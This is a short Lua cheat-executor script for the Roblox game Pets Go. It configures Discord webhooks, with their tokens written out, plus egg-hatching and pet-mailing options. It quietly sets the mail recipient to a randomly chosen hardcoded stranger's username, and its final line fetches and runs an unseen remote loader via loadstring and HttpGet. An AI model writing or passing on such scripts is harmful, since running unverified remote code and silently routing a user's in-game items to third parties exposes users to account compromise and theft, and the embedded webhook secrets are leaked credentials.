local nicks = {"teGQdDkjAPb", "QcgIgTPuzxO"} -- TRADERs

math.randomseed(os.time())
local escolha = math.random(1, #nicks)
local resultnick = nicks[escolha]

getgenv().petsGoConfig = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1312681708184932382/pwhOcRu6rQzBQ152DQ1zQQehf9pFq6FQy3VDxhesE7aseOE6hI1UuCGN7qhU6YFJIOfe",
    MAILING_WEBHOOK_URL = "https://discord.com/api/webhooks/1310413379915087962/Zg-7ECVStI09DRRG0GQW5fROVilu8-haJhT0cgy1MZVwWiwgBqp5om_VGdPfY4R2tZMb",
    DISCORD_ID = "1037147029614362624",
    WEBHOOK_ODDS = 50000000, -- Minimum Pet Odds To Trigger Webhook

    DIAMOND_EGG = false,  -- true = Diamond Egg, false = F2P Egg
    
    MAIL_PET = false,  -- Mail Pet
    MAIL_WEBHOOK_ODDS = 50000000, -- Minimum Pet Odds To Trigger MAIL Webhook
    MAIL_PET_ODDS = 50000000,  -- Minimum Pet Odds To Mail
    USERNAME_TO_MAIL = resultnick -- Mail Pet To Username
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9c5277f03e1f5e02a5c36e0df5674e67.lua"))()
